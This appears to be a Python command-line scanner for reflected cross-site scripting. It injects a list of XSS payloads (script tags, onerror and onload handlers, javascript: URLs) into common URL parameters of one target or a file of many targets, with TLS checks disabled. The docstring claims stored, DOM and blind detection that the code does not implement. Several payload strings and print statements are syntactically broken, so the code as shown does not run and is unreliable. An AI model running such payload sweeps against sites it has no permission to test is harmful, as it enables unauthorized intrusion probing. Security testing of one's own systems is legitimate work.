#!/usr/bin/env python3
"""
XSS Scanner - Cross-Site Scripting detection
Types: Reflected, Stored, DOM-based, Blind XSS

Techniques:
  - Reflected: Payload in URL/params, check response reflection
  - Stored: Payload in forms, check persistent storage
  - DOM-based: JavaScript execution via DOM manipulation
  - Blind: Payloads that callback to external listener
"""
print("[XSS Scanner - Run: python3 xss_scanner.py <url>]")
import requests, sys, concurrent.futures, os
requests.packages.urllib3.disable_warnings()

BANNER = '''
╔═══════════════════════════════════════════╗
║     XSS Scanner - Cross-Site Scripting    ║
║  Reflected | Stored | DOM | Blind         ║
╚═══════════════════════════════════════════╝
'''

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    ""><script>alert(1)</script>",
    "'-alert(1)-'",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "'';!--"<XSS>=&{()}",
]

def scan_xss(target):
    base = f"https://{target}" if not target.startswith("http") else target
    base = base.rstrip("/")
    results = {"target": target, "vulnerable": False, "findings": []}
    
    # Test GET parameters
    inject_params = ["q", "search", "s", "query", "page", "id", "cat", "name"]
    
    for param in inject_params:
        for payload in XSS_PAYLOADS[:3]:  # Test first 3 payloads per param
            url = f"{base}?{param}={requests.utils.quote(payload)}"
            try:
                r = requests.get(url, timeout=10, verify=False,
                    headers={"User-Agent": "Mozilla/5.0"})
                if payload in r.text:
                    results["vulnerable"] = True
                    results["findings"].append(f"[REFLECTED] {param}={payload[:30]}...")
                    break
            except: pass
    
    return results

def main():
    print(BANNER)
    if len(sys.argv) < 2:
        print("Usage: python3 xss_scanner.py <target|file>")
        print("       python3 xss_scanner.py https://example.com/search?q=test")
        print("       python3 xss_scanner.py targets.txt")
        sys.exit(1)
    
    targets = []
    if os.path.isfile(sys.argv[1]):
        with open(sys.argv[1]) as f:
            targets = [l.strip() for l in f if l.strip()]
    else:
        targets = [sys.argv[1]]
    
    print(f"[*] Testing {len(targets)} targets for XSS...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        fut = {ex.submit(scan_xss, t): t for t in targets}
        for f in concurrent.futures.as_completed(fut):
            r = f.result()
            if r["vulnerable"]:
                print(f"
[!!] {r['target']}")
                for finding in r["findings"]:
                    print(f"     {finding}")
    
    print("
[*] Done")

if __name__ == "__main__":
    main()
